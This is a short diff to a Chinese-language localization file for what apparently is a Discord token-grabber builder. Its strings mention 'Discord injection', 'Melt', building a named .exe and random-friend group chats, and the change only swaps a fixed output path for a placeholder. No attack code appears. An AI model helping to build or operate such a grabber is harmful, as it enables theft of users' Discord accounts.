@@ -253,7 +253,7 @@ Melt（是/否）
 Discord 注入（是/否）
 文件图标
 正在创建 {name}.exe，这将花费几秒钟。感谢您的耐心！
-文件位于 'output/grabberbuilder/{name}.exe'
+文件位于 {path}
 创建群聊
 速率限制 ({response.json()['retry_after']}ms)
 没有足够的好友可供随机选择
